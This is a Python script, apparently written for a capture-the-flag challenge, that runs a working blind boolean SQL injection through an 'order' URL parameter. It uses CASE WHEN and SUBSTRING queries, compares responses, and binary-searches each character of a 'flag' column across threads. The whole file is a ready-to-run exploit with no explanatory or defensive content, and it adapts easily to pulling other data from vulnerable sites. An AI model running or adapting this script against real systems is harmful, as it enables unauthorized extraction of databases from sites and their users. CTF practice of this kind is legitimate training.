#!/bin/python3
import requests, string, sys
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv)!=4:
    print('Invalid Syntax')
    print(f'Syntax: {sys.argv[0]} <IP> <index_firstChar> <index_lastChar>')
    exit()

#User Input
IP=str(sys.argv[1])
first=int(sys.argv[2])
last=int(sys.argv[3])

#Chars to test for each position
possible=str(string.digits+string.ascii_uppercase+string.ascii_lowercase+'{}')

#Making request for future comparisons
x=requests.get('http://'+IP+'/?order=title')
noInjectResponse=x.text

#Dictionary to store flag chars
dFlag={}

#Given a position the function will check if a char is >,< or ==
def checkChar(c,n,o):
    y=requests.get('http://'+IP+f'/?order=(CASE%20WHEN%20(SELECT%20SUBSTRING(flag,{n},1%20)%20FROM%20flag%20){o}%22{c}%22%20THEN%20title%20ELSE%20date%20END)')
    if y.text !=noInjectResponse:
        return False
    else:
        return True

#The function discover the char given the position needed and uses binary search
def discover(n):
    b=0
    e=len(possible)-1
    print(f'Discovering char[{n}]')
    while(b<=e):
        if checkChar(possible[(b+e)//2],n,'<'):
            e=(b+e)//2-1
        elif checkChar(possible[(b+e)//2],n,'>'):
            b=(b+e)//2+1
        else:
            if checkChar(possible[(b+e)//2],n,'='):
                print(f'[{n}] Found: {possible[(b+e)//2]}')
                dFlag[n]=possible[(b+e)//2]
                return possible[(b+e)//2]
            else:
                print(f'[{n}] Not Found')
                return None
            break

#Function that uses threads to find chars for each position and finally concatenate it in order
def main():
    executor = ThreadPoolExecutor(max_workers=last-first)
    for i in range(first,last+1):
        executor.submit(discover,i)
    executor.shutdown(wait=True,cancel_futures=False) #Waiting for all the threads
    flag=''
    for i in sorted(dFlag):
        flag+=dFlag[i]
    print(f'Flag: {flag}') 


main()

